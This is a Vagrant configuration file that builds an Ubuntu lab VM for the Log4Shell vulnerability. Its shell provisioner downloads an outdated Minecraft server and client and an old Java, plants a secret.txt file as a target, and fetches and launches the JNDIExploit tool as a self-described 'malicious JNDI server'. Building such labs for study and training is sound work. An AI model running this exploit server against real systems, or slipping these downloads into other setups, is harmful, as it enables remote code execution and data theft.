# -*- mode: ruby -*-
# vi: set ft=ruby :

# All Vagrant configuration is done below. The "2" in Vagrant.configure
# configures the configuration version (we support older styles for
# backwards compatibility). Please don't change it unless you know what
# you're doing.
Vagrant.configure("2") do |config|
  # The most common configuration options are documented and commented below.
  # For a complete reference, please see the online documentation at
  # https://docs.vagrantup.com.

  # Every Vagrant development environment requires a box. You can search for
  # boxes at https://vagrantcloud.com/search.
  config.vm.box = "ubuntu/jammy64"
  config.vm.provider :virtualbox
  config.vm.network "private_network", ip: "172.30.1.5"
  if Vagrant.has_plugin?("vagrant-vbguest") then
    config.vbguest.auto_update = false
  end

  # Create a forwarded port mapping which allows access to a specific port
  # within the machine from a port on the host machine. In the example below,
  # accessing "localhost:8080" will access port 80 on the guest machine.
  # NOTE: This will enable public access to the opened port
  # config.vm.network "forwarded_port", guest: 80, host: 8080

  # Create a forwarded port mapping which allows access to a specific port
  # within the machine from a port on the host machine and only allow access
  # via 127.0.0.1 to disable public access
  # config.vm.network "forwarded_port", guest: 80, host: 8080, host_ip: "127.0.0.1"

  # Create a private network, which allows host-only access to the machine
  # using a specific IP.
  # config.vm.network "private_network", ip: "192.168.33.10"

  # Create a public network, which generally matched to bridged network.
  # Bridged networks make the machine appear as another physical device on
  # your network.
  # config.vm.network "public_network"

  # Share an additional folder to the guest VM. The first argument is
  # the path on the host to the actual folder. The second argument is
  # the path on the guest to mount the folder. And the optional third
  # argument is a set of non-required options.
  # config.vm.synced_folder "../data", "/vagrant_data"

  # Provider-specific configuration so you can fine-tune various
  # backing providers for Vagrant. These expose provider-specific options.
  # Example for VirtualBox:
  #
   config.vm.provider "virtualbox" do |vb|
     # Display the VirtualBox GUI when booting the machine
     vb.gui = true
     vb.customize ['modifyvm', :id, '--clipboard-mode', 'bidirectional']
  
     # Customize the amount of memory on the VM:
     vb.memory = "4096"
   end
  #
  # View the documentation for the provider you are using for more
  # information on available options.

  # Enable provisioning with a shell script. Additional provisioners such as
  # Ansible, Chef, Docker, Puppet and Salt are also available. Please see the
  # documentation for more information about their specific syntax and use.
   config.vm.provision "shell", inline: <<-SHELL
    echo 'installing deps'
    apt-get update
    apt-get install xfce4 virtualbox-guest-dkms virtualbox-guest-utils virtualbox-guest-x11 libsecret-1-0 gdm -y
    apt install unzip gdebi-core xinit xfce4-session -y
    sudo sed -i 's/allowed_users=.*$/allowed_users=anybody/' /etc/X11/Xwrapper.config
    uuidgen > secret.txt
    mkdir exploit
    curl -L https://launcher.mojang.com/v1/objects/886945bfb2b978778c3a0288fd7fab09d315b25f/server.jar -o server.jar
    curl -L https://launcher.mojang.com/v1/objects/0f275bc1547d01fa5f56ba34bdc87d981ee12daf/client.jar -o client.jar
    curl -L https://github.com/ojdkbuild/ojdkbuild/releases/download/1.8.0.121-1/java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip -o java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip
    curl "http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream" -o ./exploit/JNDIExploit.v1.2.zip
    wget https://launcher.mojang.com/download/Minecraft.deb
    unzip -o ./exploit/JNDIExploit.v1.2.zip -d ./exploit/
    unzip -o java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip && rm java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip
    mv -f java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64/ /usr/lib/
    export JAVA_HOME=/usr/lib/java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64/bin
    export PATH=$JAVA_HOME:$PATH
    export JAVA_HOME=/usr/lib/java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64/bin >> /etc/profile
    export PATH=$JAVA_HOME:$PATH >> /etc/profile
    source /etc/profile
    echo 'starting minecraft server in the background'
    screen -d -m -S game bash -c "java -Xms1G -Xmx1G -jar ./server.jar --nogui && sed -i 's/false/true/' ./eula.txt && java -Xms1G -Xmx1G -jar ./server.jar --nogui"
    gdebi -n Minecraft.deb
    echo 'starting malicious JNDI server in background'
    screen -d -m -S killbox bash -c "cd exploit; java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.30.1.5 -p 8888"
    dpkg-reconfigure gdm
    echo 'DONE'
   SHELL
end
